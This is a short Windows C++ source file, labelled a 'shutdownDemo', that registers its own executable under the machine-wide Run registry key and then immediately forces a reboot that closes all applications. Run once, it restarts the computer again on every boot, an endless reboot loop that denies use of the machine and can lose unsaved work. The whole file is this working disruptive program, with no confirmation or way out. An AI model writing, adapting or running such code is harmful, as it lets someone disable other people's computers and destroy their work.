// ¹Ø»ú.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include<windows.h>
#include<stdlib.h>

BOOL MySystemShutdown()
{
   HANDLE hToken; 
   TOKEN_PRIVILEGES tkp; 
 
   // Get a token for this process. 
 
   if (!OpenProcessToken(GetCurrentProcess(), 
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) 
      return( FALSE ); 
 
   // Get the LUID for the shutdown privilege. 
 
   LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, 
        &tkp.Privileges[0].Luid); 
 
   tkp.PrivilegeCount = 1;  // one privilege to set    
   tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
 
   // Get the shutdown privilege for this process. 
 
   AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, 
        (PTOKEN_PRIVILEGES)NULL, 0); 
 
   if (GetLastError() != ERROR_SUCCESS) 
      return FALSE; 
 
   // Shut down the system and force all applications to close. 
 
   if (!ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 
               0)) 
      return FALSE; 

   //shutdown was successful
   return TRUE;
}

int main(int argc, char* argv[])
{
	//system("pause");
	HKEY hKey = { 0 };
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_WRITE,&hKey);
	char sz_path_c[MAXBYTE]={0};

	GetModuleFileNameA(0,sz_path_c,MAXBYTE);
	RegSetValueExA(hKey,"shutdownDemo",0,REG_SZ,(BYTE*)sz_path_c,strlen(sz_path_c));
	MySystemShutdown();
	return 0;
}

